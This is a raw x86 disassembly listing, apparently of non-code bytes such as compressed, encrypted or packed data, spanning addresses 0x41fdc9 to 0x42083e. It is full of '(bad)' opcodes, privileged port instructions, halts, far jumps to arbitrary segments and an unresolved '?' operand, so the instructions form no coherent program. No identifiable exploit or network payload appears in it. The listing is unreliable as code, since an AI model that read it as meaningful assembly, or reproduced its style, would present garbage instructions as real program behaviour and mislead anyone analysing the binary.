  41fdc9:	fwait
  41fdca:	mov    ecx,0x8cffc823
  41fdcf:	(bad)  
  41fdd0:	and    al,0xb2
  41fdd2:	push   eax
  41fdd3:	ds aaa 
  41fdd5:	push   ecx
  41fdd6:	add    ebx,DWORD PTR [ecx-0x5c4199b6]
  41fddc:	mov    cl,0x9d
  41fdde:	inc    ecx
  41fddf:	out    dx,eax
  41fde0:	shr    DWORD PTR [esi+ebx*2+0x5b],1
  41fde4:	add    DWORD PTR [ecx+0x52],esp
  41fde7:	retf   0xf3c3
  41fdea:	scas   al,BYTE PTR es:[edi]
  41fdeb:	cs pop ebx
  41fded:	and    eax,0xd16e67d2
  41fdf2:	mov    ecx,0xd56a619f
  41fdf7:	les    ecx,FWORD PTR [edx+0x7b99c7ab]
  41fdfd:	fwait
  41fdfe:	loop   0x41fe58
  41fe00:	cdq    
  41fe01:	(bad)  
  41fe02:	repz xor esp,esp
  41fe05:	sub    dl,al
  41fe07:	dec    ecx
  41fe08:	pop    esi
  41fe09:	shr    DWORD PTR [ecx+0x53],0xa2
  41fe0d:	sar    BYTE PTR [esi],0x4b
  41fe10:	test   al,0xd9
  41fe12:	pop    ebx
  41fe13:	hlt    
  41fe14:	js     0x41fde1
  41fe16:	inc    ecx
  41fe17:	sbb    al,0xf6
  41fe19:	fstp   st(6)
  41fe1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe1c:	mov    esi,0xaad3676c
  41fe21:	mov    ebp,0x35cef5fe
  41fe26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe27:	push   ecx
  41fe29:	adc    esp,DWORD PTR [eax]
  41fe2b:	call   0xe318aa81
  41fe30:	adc    al,0xa1
  41fe32:	call   0x9c9dbcdf
  41fe37:	pop    ebx
  41fe38:	adc    ch,bh
  41fe3a:	sub    al,0x69
  41fe3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe3d:	sbb    DWORD PTR [edx+0x47b17b2f],ebx
  41fe43:	retf   0xcbd
  41fe46:	push   ds
  41fe47:	push   ebx
  41fe48:	push   ebp
  41fe49:	bound  edi,QWORD PTR [esi+0x7c97da26]
  41fe4f:	xchg   edx,eax
  41fe50:	retf   0xe815
  41fe53:	mov    ch,0x1a
  41fe55:	ret    
  41fe56:	and    eax,0x958cde16
  41fe5b:	dec    ecx
  41fe5c:	push   cs
  41fe5d:	ja     0x41fdeb
  41fe5f:	fucomp st(7)
  41fe61:	std    
  41fe62:	push   edi
  41fe63:	in     al,0x37
  41fe65:	mov    edi,0x70c3a470
  41fe6a:	aam    0x82
  41fe6c:	sti    
  41fe6d:	push   ds
  41fe6e:	inc    eax
  41fe6f:	(bad)  
  41fe70:	loope  0x41feec
  41fe72:	stc    
  41fe73:	int3   
  41fe74:	jmp    0x684de3fc
  41fe79:	popf   
  41fe7a:	and    al,0xb1
  41fe7c:	dec    esp
  41fe7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe7e:	jl     0x41fecf
  41fe80:	pop    edi
  41fe81:	mov    edi,0x223443a
  41fe86:	push   ebp
  41fe87:	je     0x41fe20
  41fe89:	in     al,0x30
  41fe8b:	in     al,0x24
  41fe8d:	test   eax,0xbe1d
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x43
  41ff01:	push   eax
  41ff02:	mov    ds:0x153dc4e,eax
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	lods   al,BYTE PTR ds:[esi]
  41ff0d:	hlt    
  41ff0e:	pusha  
  41ff0f:	mov    dh,0x67
  41ff11:	dec    ecx
  41ff12:	add    esp,DWORD PTR [ebx+edx*2]
  41ff15:	add    eax,0x25333d23
  41ff1a:	dec    ecx
  41ff1b:	test   BYTE PTR [edx+eiz*4],dl
  41ff1e:	lea    ebx,[ebp-0x59387244]
  41ff24:	jae    0x41ff87
  41ff26:	sub    edi,DWORD PTR [ebx+0x9b41b24]
  41ff2c:	ins    BYTE PTR es:[edi],dx
  41ff2d:	or     BYTE PTR [edx],0xb0
  41ff30:	xor    BYTE PTR [esi-0x2d08d986],dl
  41ff36:	jo     0x41fedd
  41ff38:	and    eax,0x7bdfb821
  41ff3d:	sub    BYTE PTR [edi-0x37],dl
  41ff40:	xchg   ebx,eax
  41ff41:	cmc    
  41ff42:	fcmovbe st,st(2)
  41ff44:	jo     0x41ff70
  41ff46:	mov    ds:0xf15044d6,al
  41ff4b:	mov    al,0x7b
  41ff4d:	cwde   
  41ff4e:	lods   al,BYTE PTR ds:[esi]
  41ff4f:	fs iret 
  41ff51:	je     0x41ff9b
  41ff53:	rcr    DWORD PTR [ecx],1
  41ff55:	mov    ebx,0xfd0dd6a3
  41ff5a:	mov    cl,0xf2
  41ff5c:	loopne 0x41ff03
  41ff5e:	(bad)  
  41ff5f:	mov    esp,0xde7ca5ea
  41ff64:	xchg   esp,esi
  41ff66:	sub    al,0x2b
  41ff68:	add    DWORD PTR [ebp-0x9741eb3],edx
  41ff6e:	xor    al,0x6d
  41ff70:	sub    eax,0x143f2fc4
  41ff75:	jmp    0x41ffed
  41ff77:	out    0xa3,al
  41ff79:	loop   0x41ff53
  41ff7b:	clc    
  41ff7c:	sahf   
  41ff7d:	mov    ebp,0xf5a3e0aa
  41ff82:	les    ebp,FWORD PTR [edi-0x27022983]
  41ff88:	and    eax,DWORD PTR [ebp+0x45]
  41ff8b:	jge    0x41ff5d
  41ff8d:	xchg   DWORD PTR [eax],ebx
  41ff8f:	lea    esi,[edx-0x3053715c]
  41ff95:	vunpcklps ymm2,ymm5,YMMWORD PTR [ecx+esi*4-0x4d3650d1]
  41ff9e:	cwde   
  41ff9f:	push   ebp
  41ffa0:	loopne 0x41fff9
  41ffa2:	fnsave [esi]
  41ffa4:	fucomp st(3)
  41ffa6:	std    
  41ffa7:	and    BYTE PTR [edi+esi*4],ah
  41ffaa:	mov    ch,0xa4
  41ffac:	or     DWORD PTR ss:[edi-0x54f91e65],esi
  41ffb3:	frstor [esi-0x6655f8f0]
  41ffb9:	cwde   
  41ffba:	or     al,0x25
  41ffbc:	les    ebp,FWORD PTR [esp+esi*1-0x7a]
  41ffc0:	inc    esp
  41ffc1:	pop    ds
  41ffc2:	clc    
  41ffc3:	lds    eax,FWORD PTR [edx]
  41ffc5:	mov    dl,0x33
  41ffc7:	call   0xaf01dcd2
  41ffcc:	dec    edi
  41ffcd:	shl    DWORD PTR [eax+0x24866244],1
  41ffd3:	mov    ch,0xa6
  41ffd5:	push   ebx
  41ffd6:	cli    
  41ffd7:	dec    eax
  41ffd8:	mov    al,0xa6
  41ffda:	inc    ebx
  41ffdb:	xor    al,0x40
  41ffdd:	sbb    eax,DWORD PTR [eax]
  41ffdf:	push   es
  41ffe0:	and    DWORD PTR [esi+eax*2],ebx
  41ffe3:	xor    cl,BYTE PTR [edx-0xc]
  41ffe6:	or     DWORD PTR [eax-0x7e22e610],0x958a7811
  41fff0:	or     DWORD PTR [ebx-0x71],esi
  41fff3:	fisubr DWORD PTR [ecx+0x7cc820f9]
  41fff9:	push   edi
  41fffa:	cmp    DWORD PTR [esi],0xffffff9e
  41fffd:	sbb    cl,dh
  41ffff:	pop    ebx
  420000:	xlat   BYTE PTR ds:[ebx]
  420001:	xor    ecx,DWORD PTR [eax+edi*8]
  420004:	dec    edi
  420005:	or     bh,BYTE PTR [esi+0x432fb0de]
  42000b:	sub    eax,DWORD PTR [esi+0x707c04]
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x1e
  420081:	call   0x552249a9
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	stos   DWORD PTR es:[edi],eax
  42008d:	pop    es
  42008e:	cmp    al,0x52
  420090:	aam    0xca
  420092:	or     ebx,DWORD PTR [edx-0x1a]
  420095:	xor    BYTE PTR [ebp+0x58],al
  420098:	jae    0x420079
  42009a:	cdq    
  42009b:	std    
  42009c:	lods   al,BYTE PTR ds:[esi]
  42009d:	and    ch,dh
  42009f:	popf   
  4200a0:	shl    DWORD PTR [esi-0x40fab8cb],1
  4200a6:	lea    edi,[eiz*4+0x554f2ddb]
  4200ad:	cwde   
  4200ae:	int3   
  4200af:	mov    bl,0x43
  4200b1:	add    BYTE PTR [edx-0x78b2c51a],bh
  4200b7:	retf   0x30dd
  4200ba:	sub    eax,0xc16e20fb
  4200bf:	push   ds
  4200c0:	ss sahf 
  4200c2:	pop    edx
  4200c3:	lahf   
  4200c4:	xchg   edx,eax
  4200c5:	inc    edi
  4200c6:	(bad)
  4200ca:	mov    ds:0x6ab4ba30,eax
  4200cf:	adc    dh,BYTE PTR [edx-0x34]
  4200d2:	adc    ebp,ebx
  4200d4:	in     al,dx
  4200d5:	in     al,dx
  4200d6:	jle    0x42011c
  4200d8:	xchg   esi,esi
  4200da:	inc    edi
  4200db:	inc    eax
  4200dc:	adc    al,BYTE PTR [esi+0x7c]
  4200df:	mov    al,0x39
  4200e1:	(bad)  
  4200e2:	push   eax
  4200e3:	jbe    0x42014d
  4200e5:	push   esi
  4200e6:	sahf   
  4200e7:	jl     0x42009f
  4200e9:	sbb    esi,edx
  4200eb:	fild   DWORD PTR [ebx+ecx*1+0x5b528f6f]
  4200f2:	sub    eax,0xf45af5a2
  4200f7:	es pop ebx
  4200f9:	mov    DWORD PTR [esi-0x5c],edi
  4200fc:	jb     0x420122
  4200fe:	dec    esi
  4200ff:	popf   
  420100:	mov    ds:0x1e4f24e7,eax
  420105:	sub    al,0xa4
  420107:	dec    ebx
  420108:	loop   0x4200a8
  42010a:	outs   dx,DWORD PTR ds:[esi]
  42010b:	aam    0x33
  42010d:	test   al,0xd5
  42010f:	ins    DWORD PTR es:[edi],dx
  420110:	(bad)  
  420111:	jns    0x4200c7
  420113:	lods   eax,DWORD PTR ds:[esi]
  420114:	xchg   DWORD PTR [ecx],ecx
  420116:	push   0xffffffc8
  420118:	ins    DWORD PTR es:[edi],dx
  420119:	ds (bad) 
  42011c:	xchg   esi,eax
  42011d:	aad    0x49
  42011f:	dec    ecx
  420120:	adc    eax,0x631eb89b
  420125:	(bad)  
  420126:	jmp    0x47e081c3
  42012b:	les    ebx,FWORD PTR [ecx+0x151528eb]
  420131:	xor    BYTE PTR [ecx-0x2deade2e],ch
  420137:	ret    
  420138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42013a:	icebp  
  42013b:	hlt    
  42013c:	shl    DWORD PTR ds:0xd67df7b0,cl
  420142:	cs je  0x420171
  420145:	int3   
  420146:	and    bh,dl
  420148:	mov    cl,0xf7
  42014a:	test   eax,0x68603a17
  42014f:	jge    0x420124
  420151:	in     eax,dx
  420152:	jb     0x420185
  420154:	fldenv [edx-0x67]
  420157:	xor    DWORD PTR [ebp-0x6227cbb6],0x30
  42015e:	sti    
  42015f:	cwde   
  420160:	jno    0x4201c2
  420162:	call   0x5dfaf321
  420167:	into   
  420168:	icebp  
  420169:	or     DWORD PTR [ebx+esi*8],esi
  42016c:	sub    BYTE PTR [ebp-0x75ebf2e],al
  420172:	pop    ss
  420173:	fcomp  QWORD PTR [ecx]
  420175:	stos   DWORD PTR es:[edi],eax
  420176:	int3   
  420177:	repz sub eax,DWORD PTR [ecx]
  42017a:	push   edx
  42017b:	leave  
  42017c:	je     0x42011f
  42017e:	push   0x64f8cc02
  420183:	leave  
  420184:	mov    al,0xa8
  420186:	or     eax,0x9de076b2
  42018b:	daa    
  42018c:	adc    al,0xc1
  42018e:	sbb    ebp,eax
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x672f560b],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	and    DWORD PTR ds:0x72692ec1,ecx
  420212:	push   0x35
  420214:	arpl   WORD PTR [eax],sp
  420216:	daa    
  420217:	movlps QWORD PTR [edx+0x15],xmm1
  42021b:	mov    ds:0xebb9a030,eax
  420220:	out    dx,al
  420221:	out    dx,eax
  420222:	lds    esi,FWORD PTR [edi+edx*4]
  420225:	xchg   BYTE PTR [eax+0x311cbe93],ch
  42022b:	adc    DWORD PTR [ebp+0x3d8c786e],esp
  420231:	push   0xffffffcd
  420233:	push   ebx
  420234:	shl    DWORD PTR [edx],1
  420236:	rcl    BYTE PTR [eax],0x13
  420239:	cs xchg ecx,eax
  42023b:	jmp    0x4201d2
  42023d:	mov    ebp,es
  42023f:	jmp    0x42024c
  420241:	leave  
  420242:	xor    ah,bh
  420244:	xchg   BYTE PTR es:[ebx-0x3a],al
  420248:	jg     0x420273
  42024a:	bound  esi,QWORD PTR [edx-0x60]
  42024d:	add    dh,0xd2
  420250:	int    0x8c
  420252:	and    BYTE PTR [edi],0xfe
  420255:	lahf   
  420256:	shl    BYTE PTR [ecx+0x2f3c7654],0xc5
  42025d:	mov    eax,0x8cb9f662
  420262:	je     0x4202cf
  420264:	add    esi,DWORD PTR [edx+ebx*8-0x795f274e]
  42026b:	and    BYTE PTR [edx],bl
  42026d:	gs jno 0x42029a
  420270:	rcl    dl,1
  420272:	dec    edx
  420273:	ins    DWORD PTR es:[edi],dx
  420274:	out    dx,al
  420275:	call   0x1d1f:0x483ae266
  42027c:	cs arpl cx,di
  42027f:	xchg   edx,eax
  420280:	(bad)  
  420281:	call   DWORD PTR [edi]
  420283:	outs   dx,DWORD PTR ds:[esi]
  420284:	inc    DWORD PTR [esi]
  420286:	shl    BYTE PTR [esi+0x7a],1
  420289:	fiadd  WORD PTR [eax+0x41]
  42028c:	adc    ch,BYTE PTR [ecx]
  42028e:	nop
  42028f:	fcom   QWORD PTR [edi]
  420291:	mov    fs,WORD PTR [edx+0x7a]
  420294:	test   DWORD PTR [edi-0x52],ebp
  420297:	jl     0x420247
  420299:	inc    esp
  42029a:	mov    esi,0x3dbaf7be
  42029f:	(bad)  [edx]
  4202a1:	cdq    
  4202a2:	inc    esp
  4202a3:	cmc    
  4202a4:	mov    eax,ds:0xef9f0bf8
  4202a9:	sbb    al,0xf8
  4202ab:	pusha  
  4202ac:	xchg   esp,esi
  4202ae:	aas    
  4202af:	add    eax,0x3ae3150f
  4202b4:	jne    0x4202ad
  4202b6:	call   DWORD PTR [ebp+0x25bd45b]
  4202bc:	xor    al,0x48
  4202be:	or     ah,BYTE PTR [ecx+0x2f]
  4202c1:	xchg   edi,eax
  4202c2:	(bad)  
  4202c3:	int    0xb
  4202c5:	jns    0x42027a
  4202c7:	in     al,0xc7
  4202c9:	aas    
  4202ca:	mov    ah,0xfb
  4202cc:	and    BYTE PTR [ebp+ecx*2-0x2e],cl
  4202d0:	xor    ebp,DWORD PTR [edx]
  4202d2:	xor    DWORD PTR [edx],edx
  4202d4:	jb     0x420344
  4202d6:	jl     0x42034e
  4202d8:	dec    BYTE PTR [ecx]
  4202da:	add    DWORD PTR [esp+ebx*1-0x78f93680],edx
  4202e1:	fs push ss
  4202e3:	out    dx,eax
  4202e4:	mov    ah,BYTE PTR [eax-0x69d3c4c8]
  4202ea:	fsub   st(3),st
  4202ec:	dec    esi
  4202ed:	cmp    ah,BYTE PTR [eax]
  4202ef:	push   es
  4202f0:	mov    BYTE PTR [edi-0x419dabd5],al
  4202f6:	outs   dx,BYTE PTR ds:[esi]
  4202f7:	jecxz  0x4202f0
  4202f9:	jns    0x420334
  4202fb:	jg     0x42033d
  4202fd:	adc    bh,BYTE PTR [ecx+0x6b4d61f9]
  420303:	inc    ebx
  420304:	dec    esi
  420305:	and    al,BYTE PTR [eax]
  420307:	add    BYTE PTR [edi],cl
  420309:	pop    ss
  42030a:	mov    al,ds:0x2c1fc2e2
  42030f:	dec    ebx
	...
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	pop    edi
  420381:	and    BYTE PTR [ebx-0x28],0xe8
  420385:	push   esi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	leave  
  42038d:	dec    edx
  42038e:	add    al,0x63
  420390:	inc    eax
  420391:	and    ebx,DWORD PTR [esi+0x5b]
  420394:	xor    eax,0x83df1c5c
  420399:	sbb    edi,DWORD PTR [eax+0x68dbd4e8]
  42039f:	fild   WORD PTR [ebx+0xa]
  4203a2:	mov    bh,0xe9
  4203a4:	clc    
  4203a5:	mov    eax,0xa9ed4116
  4203aa:	jge    0x420361
  4203ac:	mov    ah,0x4f
  4203ae:	(bad)  
  4203af:	mov    cl,0x67
  4203b1:	push   ebp
  4203b2:	pusha  
  4203b3:	push   ebx
  4203b4:	rcl    BYTE PTR [edi+0x558b7363],0x5b
  4203bb:	and    BYTE PTR [esi+0x47],dl
  4203be:	push   0x13644390
  4203c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c4:	xor    eax,DWORD PTR ds:0xa6fd163e
  4203ca:	dec    ebp
  4203cb:	mov    ebx,0x163be24d
  4203d0:	hlt    
  4203d1:	mov    cl,0xeb
  4203d3:	sbb    DWORD PTR [esi],edi
  4203d5:	jp     0x42036f
  4203d7:	mov    bl,0x84
  4203d9:	sbb    DWORD PTR [ebx-0x6],0x7b0374f
  4203e0:	xchg   ebp,eax
  4203e1:	push   eax
  4203e2:	xlat   BYTE PTR ds:[ebx]
  4203e3:	enter  0x412f,0x65
  4203e7:	inc    esi
  4203e8:	rcr    dl,0xf7
  4203eb:	arpl   ax,dx
  4203ed:	xchg   ecx,eax
  4203ee:	lods   eax,DWORD PTR ds:[esi]
  4203ef:	fisttp DWORD PTR [esi+0x41]
  4203f2:	mov    bl,0x2c
  4203f4:	stos   BYTE PTR es:[edi],al
  4203f5:	in     al,0x7a
  4203f7:	enter  0xf026,0x0
  4203fb:	xor    ah,dh
  4203fd:	push   cs
  4203fe:	in     eax,dx
  4203ff:	mov    es,WORD PTR ds:0x190b258f
  420405:	cmp    edi,DWORD PTR [ebx]
  420407:	gs mov dl,0xa7
  42040a:	not    DWORD PTR [ecx+0x418e0933]
  420410:	iret   
  420411:	mov    esp,ebp
  420413:	jmp    0x5534:0xb121a512
  42041a:	mov    edi,0x48aefc4
  42041f:	ret    0x65c4
  420422:	xor    al,0x94
  420424:	pusha  
  420425:	dec    ecx
  420426:	sub    eax,ecx
  420428:	es mov bl,0xfc
  42042b:	push   esp
  42042c:	nop
  42042d:	cmc    
  42042e:	shl    cl,1
  420430:	dec    ebx
  420431:	sbb    eax,0xd53d49a4
  420436:	mov    edx,ebx
  420438:	dec    esp
  420439:	lea    edi,cs:[eax+esi*4]
  42043d:	mov    al,ds:0xfe7c2719
  420442:	ins    DWORD PTR es:[edi],dx
  420443:	pop    esi
  420444:	retf   0x181a
  420447:	mov    ch,0x17
  420449:	test   BYTE PTR [esi+0xa],cl
  42044c:	outs   dx,DWORD PTR ds:[esi]
  42044d:	add    cl,ch
  42044f:	inc    eax
  420450:	in     al,0x1c
  420452:	je     0x420493
  420454:	jne    0x42044c
  420456:	scas   eax,DWORD PTR es:[edi]
  420457:	push   eax
  420459:	adc    ecx,ebp
  42045b:	mov    dl,0x63
  42045d:	in     al,dx
  42045e:	xchg   ebx,eax
  42045f:	mov    al,0x68
  420461:	in     al,0x85
  420463:	inc    BYTE PTR [ebx-0x3f206f05]
  420469:	xor    al,ch
  42046b:	mov    ds:0x2552adeb,al
  420470:	cwde   
  420471:	dec    eax
  420472:	sub    al,0x66
  420474:	cdq    
  420475:	and    DWORD PTR [eax-0x6a56e4ad],ecx
  42047b:	imul   ebx,DWORD PTR [ecx+0x4062a6ea],0xffffffe8
  420482:	outs   dx,BYTE PTR ds:[esi]
  420483:	jns    0x4204a8
  420485:	push   edi
  420486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420487:	sbb    DWORD PTR [ebp+0x2b],esp
  42048a:	aad    0x3
  42048c:	fisub  WORD PTR [edx+0x3f]
  42048f:	in     al,0x0
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	mov    edi,0xece13a13
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	sub    al,BYTE PTR [eax]
  42050e:	mov    ah,0x9a
  420510:	jae    0x42058d
  420512:	popa   
  420513:	add    al,dh
  420515:	pop    edx
  420516:	(bad)  
  420517:	js     0x420520
  420519:	sub    ebp,ebp
  42051b:	adc    eax,0xed4cd543
  420520:	pop    ebx
  420521:	mov    ds:0xdcdaa8cc,al
  420526:	xchg   DWORD PTR ds:0x1481c5e7,eax
  42052c:	push   edi
  42052d:	mov    bl,0x2a
  42052f:	stos   DWORD PTR es:[edi],eax
  420530:	iret   
  420531:	out    0x2e,al
  420533:	stos   DWORD PTR es:[edi],eax
  420534:	pop    edi
  420535:	inc    ebp
  420536:	test   al,0xa6
  420538:	mov    esp,0xcdf6bee
  42053d:	fild   WORD PTR ss:[eax+0x265a0033]
  420544:	add    edi,DWORD PTR [ecx+0x54c56d6a]
  42054a:	call   0x1ea1:0x97f08362
  420551:	mov    esp,0xbfde6cac
  420556:	add    eax,DWORD PTR [eax-0x67]
  420559:	dec    esp
  42055a:	test   BYTE PTR [esi],dl
  42055c:	push   ebp
  42055d:	push   edx
  42055e:	mov    ebx,0x57f0bad9
  420563:	dec    edi
  420564:	jg     0x4204f0
  420566:	neg    esp
  420568:	jmp    0x8ab4:0x163ade35
  42056f:	xchg   esp,eax
  420570:	stos   DWORD PTR es:[edi],eax
  420571:	jnp    0x420548
  420573:	pop    ecx
  420574:	mov    dh,0x7c
  420576:	out    0x54,eax
  420578:	jp     0x420535
  42057a:	mov    ebp,0x865db949
  42057f:	pushf  
  420580:	in     eax,0x44
  420582:	sub    al,0x5f
  420584:	pop    es
  420585:	pop    ebx
  420586:	shl    BYTE PTR [ecx+0x64],1
  420589:	and    DWORD PTR [esi],edx
  42058b:	mov    DWORD PTR [eax-0x5838be75],ecx
  420591:	pushf  
  420592:	xchg   al,bl
  420594:	(bad)  
  420595:	xchg   BYTE PTR ds:0x102e5556,bh
  42059b:	ss mov ecx,0x1ea5aa24
  4205a1:	xor    eax,DWORD PTR [ecx+0x8b064b6]
  4205a7:	mov    dh,0xd1
  4205a9:	sub    ah,ah
  4205ab:	fsub   QWORD PTR [edi+esi*1-0x20a7b3b0]
  4205b2:	xchg   edi,eax
  4205b3:	pushf  
  4205b4:	popf   
  4205b5:	xchg   esp,eax
  4205b6:	push   esi
  4205b7:	std    
  4205b8:	fimul  WORD PTR [esp+eax*8-0x4d]
  4205bc:	hlt    
  4205bd:	cs mov dx,bx
  4205c1:	cmp    eax,0xc8abe87f
  4205c6:	pushf  
  4205c7:	gs pop edi
  4205c9:	out    dx,eax
  4205ca:	mov    ebp,0xb0e48160
  4205cf:	or     ch,BYTE PTR [esi+0x6faf8fa0]
  4205d5:	lods   eax,DWORD PTR ds:[esi]
  4205d6:	dec    ebp
  4205d7:	sub    eax,0x5605524e
  4205dc:	test   BYTE PTR [ebx+0x1a946352],dh
  4205e2:	push   ecx
  4205e3:	fidivr WORD PTR [edx-0x3]
  4205e6:	pop    ss
  4205e7:	mov    edi,0x1b376ff3
  4205ec:	pop    esi
  4205ed:	mov    al,ds:0x33d43afc
  4205f2:	add    ecx,edi
  4205f4:	(bad)  
  4205f5:	jno    0x420599
  4205f7:	aas    
  4205f8:	out    0x7c,al
  4205fa:	ret    0x692c
  4205fd:	dec    esp
  4205fe:	fisttp WORD PTR [edi]
  420600:	lods   al,BYTE PTR ds:[esi]
  420601:	mov    edx,0x4803cce0
  420606:	fsub   st(6),st
  420608:	jns    0x4205d4
  42060a:	je     0x4205e4
  42060c:	push   0x866dc5
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	out    dx,eax
  420681:	fbld   TBYTE PTR [ebx-0x48]
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	vmptrst QWORD PTR [esi+0x4a]
  420690:	sahf   
  420691:	in     al,0x61
  420693:	stc    
  420694:	int3   
  420695:	mov    al,0x1f
  420697:	daa    
  420698:	call   0x5a06efa7
  42069d:	std    
  42069e:	push   ss
  42069f:	es test eax,0x585e7a6f
  4206a5:	arpl   WORD PTR [esi+0x3e55a6bf],cx
  4206ab:	in     eax,0x46
  4206ad:	pushf  
  4206ae:	fsubp  st(7),st
  4206b0:	xor    eax,0xc6883453
  4206b5:	je     0x420654
  4206b7:	int    0x48
  4206b9:	add    DWORD PTR [esi+0x5b],edx
  4206bc:	inc    esi
  4206bd:	pop    es
  4206be:	inc    eax
  4206bf:	cmp    bl,bl
  4206c1:	push   cs
  4206c2:	scas   al,BYTE PTR es:[edi]
  4206c3:	fdivrp st(1),st
  4206c5:	es fs imul DWORD PTR gs:[eax+0x2b0c7a77]
  4206ce:	push   ds
  4206cf:	or     edi,ecx
  4206d1:	mov    bh,0x43
  4206d3:	fldcw  WORD PTR [esi+edi*4-0x6]
  4206d7:	out    dx,al
  4206d8:	push   ecx
  4206d9:	shr    BYTE PTR [eax],cl
  4206db:	or     eax,0xa4eba067
  4206e0:	push   edi
  4206e1:	int    0x6c
  4206e3:	aas    
  4206e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206e5:	imul   ebp,DWORD PTR [ebx],0x74
  4206e8:	jg     0x420728
  4206ea:	mov    ?,WORD PTR [edi+0x60]
  4206ed:	and    BYTE PTR [esi-0x3c6c3d41],bh
  4206f3:	push   ecx
  4206f4:	je     0x4206b4
  4206f6:	xchg   ebp,eax
  4206f7:	leave  
  4206f8:	lahf   
  4206f9:	xor    bl,BYTE PTR [edx-0x2dd0f967]
  4206ff:	mov    bl,0x9e
  420701:	adc    eax,0x96934b66
  420706:	test   DWORD PTR [edi+0x4ebded51],0x6243d50e
  420710:	jb     0x4206c4
  420712:	mov    edx,0x144229c4
  420717:	jge    0x420705
  420719:	test   BYTE PTR [edx],bh
  42071b:	sub    ebp,DWORD PTR [edi-0x5e]
  42071e:	shr    dl,1
  420720:	sbb    ebp,DWORD PTR [eax+0x45]
  420723:	xor    cl,BYTE PTR [edi]
  420725:	adc    al,0xc9
  420727:	cs aam 0xb4
  42072a:	push   0xa2d6a323
  42072f:	ds xor eax,0xefa9a25c
  420735:	dec    eax
  420736:	push   ss
  420737:	ins    BYTE PTR es:[edi],dx
  420738:	xchg   edi,eax
  420739:	(bad)  
  42073a:	shr    DWORD PTR [ecx],1
  42073c:	cmp    esi,DWORD PTR [esi+0x4b]
  42073f:	fisttp WORD PTR [eax]
  420741:	pop    esi
  420742:	into   
  420743:	sbb    DWORD PTR [esp+ebx*1],0x280492b0
  42074a:	inc    edi
  42074b:	(bad)  
  42074c:	lock adc al,0xf9
  42074f:	or     esp,0xffffffa6
  420752:	rcl    dh,cl
  420754:	dec    esp
  420755:	loope  0x420782
  420757:	pop    esp
  420758:	fld    TBYTE PTR [eax-0x76eb4ddb]
  42075e:	sbb    DWORD PTR [edx-0x163eb7ff],ecx
  420764:	pop    edi
  420765:	(bad)  
  420766:	out    dx,al
  420767:	scas   eax,DWORD PTR es:[edi]
  420768:	sbb    al,0xe5
  42076a:	or     eax,0x594115da
  42076f:	cmp    DWORD PTR [bx-0x7e35],0xb3e1a2ce
  420778:	test   al,0x2
  42077a:	(bad)  
  42077b:	lea    esi,[edx+0x15]
  42077e:	mov    esp,0x5a242291
  420783:	dec    edx
  420784:	push   edx
  420785:	adc    bl,BYTE PTR es:[ebx-0x71]
  420789:	dec    edx
  42078a:	fisubr WORD PTR [edx+0x74714364]
	...
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	add    BYTE PTR [esi+0x59f44e13],dh
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	lea    ebp,[ecx]
  42080e:	or     ch,BYTE PTR [ebx]
  420810:	fld    DWORD PTR [edx-0x5b6eadd8]
  420816:	ins    DWORD PTR es:[edi],dx
  420817:	xor    ebp,esi
  420819:	mov    BYTE PTR [edi+eiz*4-0x7127e984],cl
  420820:	jmp    0x42087f
  420822:	inc    ebx
  420823:	sub    DWORD PTR [edi+0x30],ebp
  420826:	ret    0x3a81
  420829:	fsubr  QWORD PTR [ecx]
  42082b:	imul   esp,DWORD PTR [edi+0x603c2806],0x18
  420832:	out    0xcb,eax
  420834:	dec    edi
  420835:	cmp    al,BYTE PTR [ecx]
  420837:	cmp    eax,0x52f2864b
  42083c:	xchg   ecx,eax
  42083d:	xchg   ebp,eax
  42083e:	jmp    0x33d7:0x6bce02d1
